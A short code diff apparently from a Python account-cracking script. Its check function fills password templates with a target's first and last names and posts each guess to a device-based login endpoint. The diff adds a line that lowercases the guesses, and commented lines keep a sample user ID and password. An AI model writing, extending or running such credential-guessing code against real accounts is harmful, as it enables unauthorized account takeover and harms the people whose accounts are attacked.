@@ -50,6 +50,7 @@ def check(uid,f,l):
             pw = pw.replace('first',f).replace('last',l).replace('First',f.capitalize()).replace('Last',l.capitalize())
             #uid = ("100075519436264")
             #pw = ("khan1122")
+            pw = pw.lower()
             p = ses.get("https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(url,uid),headers={
                 'Host':url,
                 'Connection':'keep-alive',
